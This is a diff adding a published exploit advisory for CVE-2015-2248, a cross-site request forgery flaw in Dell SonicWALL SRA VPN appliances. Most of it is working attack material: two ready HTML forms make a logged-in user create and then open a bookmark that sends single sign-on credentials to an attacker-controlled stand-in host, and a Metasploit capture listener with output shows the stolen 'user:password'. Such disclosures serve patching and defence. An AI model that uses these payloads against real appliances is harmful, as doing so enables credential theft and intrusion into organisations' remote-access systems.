@@ -1,0 +1,64 @@
+# Exploit Title: Dell SonicWALL Secure Remote Access (SRA) Appliance Cross-Site Request Forgery
+# Date: 04/28/2015
+# Exploit Author: Veit Hailperin
+# Vendor Homepage: www.dell.com
+# Version: Dell SonicWALL SRA 7.5 prior to 7.5.1.0-38sv and 8.0 prior to 8.0.0.1-16sv
+# CVE : 2015-2248
+
+Exploitation Procedure (Outline):
+  1. Use CSRF to force currently logged in user to create a bookmark pointing to an endpoint controlled by the attacker.
+  2. Use subsequent request to call the bookmark just created. The identifier of the bookmark can be bruteforced using a single decrementing integer and causes minimal time delay.
+  3. Gather the credentials on the target server provided in step #1 
+  
+1. Create a bookmark:
+
+<html>
+  <body>
+    <form action="https://vulnerable.vpn-installation.tld/cgi-bin/editBookmark" method="POST">
+      <input type="hidden" name="bmName" value="foo" />
+      <input type="hidden" name="host" value="www.malicious-host.tld" />
+      <input type="hidden" name="description" value="bar" />
+      <input type="hidden" name="tabs" value="Baz" />
+      <input type="hidden" name="service" value="HTTP" />
+      <input type="hidden" name="fbaSSOEnabled" value="on" />
+      <input type="hidden" name="fbaSSOFormUserName" value="user" />
+      <input type="hidden" name="fbaSSOFormUserPassword" value="password" />
+      <input type="hidden" name="MC&#95;App" value="inherit" />
+      <input type="hidden" name="MC&#95;Copy" value="inherit" />
+      <input type="hidden" name="MC&#95;Print" value="inherit" />
+      <input type="hidden" name="MC&#95;Offline" value="inherit" />
+      <input type="hidden" name="name" value="name" />
+      <input type="hidden" name="type" value="type" />
+      <input type="hidden" name="owner" value="owner" />
+      <input type="hidden" name="cmd" value="add" />
+      <input type="hidden" name="wantBmData" value="true" />
+      <input type="hidden" name="ok" value="OK" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+2. Call the newly created bookmark
+This might require some guesswork, because we don't know which value bookmarkAccessed needs to have.
+
+<html>
+  <body>
+    <form action="https://vulnerable.vpn-installation.tld/cgi-bin/http">
+      <input type="hidden" name="HOST" value="www.malicious-host.tld" />
+      <input type="hidden" name="bookmarkAccessed" value="4" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+3. Set up a listener
+E.g. metasploit payload 
+use auxiliary/server/capture/http_basic
+
+msf auxiliary(http_basic) > 
+[*] Listening on 0.0.0.0:80...
+[*] Using URL: http://0.0.0.0:80/
+[*]  Local IP: http://www.malicious-host.tld:80/
+[*] Server started.
+[*] vulnerable.vpn-installation.tld    http_basic - Sending 401 to client vulnerable.vpn-installation.tld
+[+] vulnerable.vpn-installation.tld    http_basic - vulnerable.vpn-installation.tld - Credential collected: "user:password" 
